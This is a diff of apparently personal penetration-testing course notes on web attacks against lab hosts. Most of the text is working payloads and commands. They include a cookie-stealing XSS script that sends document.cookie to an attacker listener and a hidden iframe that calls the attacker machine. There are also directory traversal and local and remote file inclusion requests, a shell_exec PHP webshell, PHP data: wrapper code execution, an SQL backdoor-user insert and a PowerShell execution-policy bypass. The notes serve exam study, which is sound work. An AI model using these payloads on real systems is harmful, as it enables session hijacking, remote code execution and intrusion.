@@ -42,19 +42,19 @@ insert into webappdb.users(password, username) VALUES ('backdoor','backdoor');  
 # basic XSS
 try - <scriot>alert('XSS')</script>
 #Content Injection
-<iframe src=https://10.11.0.4/report height="0" width="0"></iframe>
+<iframe src=http://10.11.0.4/report height=”0” width=”0”></iframe>
 next start listener on our attack machine - sudo nc -lvnp 80 - and visit the comment page - we see in our nc the request from our target
-# Stealing Cookies / PHPSESSIONID / etc
+# Stealing Cookies and Sessions
 - set our netcat -> sudo nc -lvnp 80
 - use XSS payload on comment section:
-<script>new Image().src="http://10.11.0.4ourNetCatIP/cool.jpg?output="+document.cookie;</script>
-= on the target we'll use script to simulate admin login. In cmd write:
-powershell -ExecutionPolicy Bypass -File Documents/admin_login.ps1    #script loging in and out, run from cmd and using powershell with executionpolicy bypass to temporarily use unsigned scripts
+<script>new Image().src="http://10.11.0.4OurAttackMachineIP/cool.jpg?output="+document.cookie;</script>
+- on the target we'll use script to simulate admin login. In cmd write:
+powershell -ExecutionPolicy Bypass -File admin_login.ps1    #script loging in and out, run from cmd and using powershell with executionpolicy bypass to temporarily use unsigned scripts
 
-#Directory Traversal / Path Traversal Vulns
-## Identifying and Exploiting Dir Travesal Vulns    #search for /etc/passwd on linux or boot.ini in win
+#9.4.3 Directory Traversal / Path Traversal Vulns   #This vulnerability occurs when input is poorly validated, subsequently granting an attacker the ability to manipulate file paths with “../” or “..\” characters.
+## Identifying and Exploiting Dir Travesal Vulns    #search for /etc/passwd on linux or c:\boot.ini in win
 # we can target on Win - c:\windows\system32\drivers\etc\hosts file
-- in the vulnerable URL 10.11.0.22/menu.php?file=current_menu.php --> 10.11.0.22/menu.php?file=c:\windows\system32\drivers\etc\hosts  --> print the content of the hosts file     ## we can read files, including those outside of the web root directory
+- in the vulnerable URL 10.11.0.22/menu.php?file=current_menu.php --> http://10.11.0.22/menu.php?file=c:\windows\system32\drivers\etc\hosts  --> print the content of the hosts file     ## we can read files, including those outside of the web root directory
 ## File Inclusion Vulns     #not only we can read as in Dir Traversal, but we can icnlude files into the app's running code // write shell somewhere
 ### Identify R/LFI vulns    // RFI easyer to Exploit than LFI
 #### Exploit LFI
@@ -75,6 +75,31 @@ cat /var/www/html/evil.txt --> <?php echo '<pre>' . shell_exec($_GET['cmd']) . '
 sudo systemctl start apache2
 # exploit RFI:
 10.11.0.22/menu.php?file=http://10.11.0.4.evil.txt&cmd=ipconfig   #same results as LFI before   #very simple webshell!
+
+# Expand Our Repertoire
+## Create HTTP Servers on Kali:
+apache --> sudo service apache2 start /or/ sudo /etc/init.d/apache2 start /or/ sudo systemctl start apache2.service
+python -m SimpleHTTPServer 7331
+python3 -m http.server 7331
+php -S 0.0.0.0:8000
+ruby -run -e httpd . -p 9000    # . for current directory
+busybox httpd -f -p 10000       # -f - run interactively
+
+# PHP Wrappers    #inj php through LFI # we can use this filters when we can't poison local files with php code!
+http://10.11.0.22/menu.php?file=data:text/plain,hello world
+http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
+
+# SQL injections
+SELECT * FROM users;
+
+
+
+
+
+
+
+
+
 
 
 
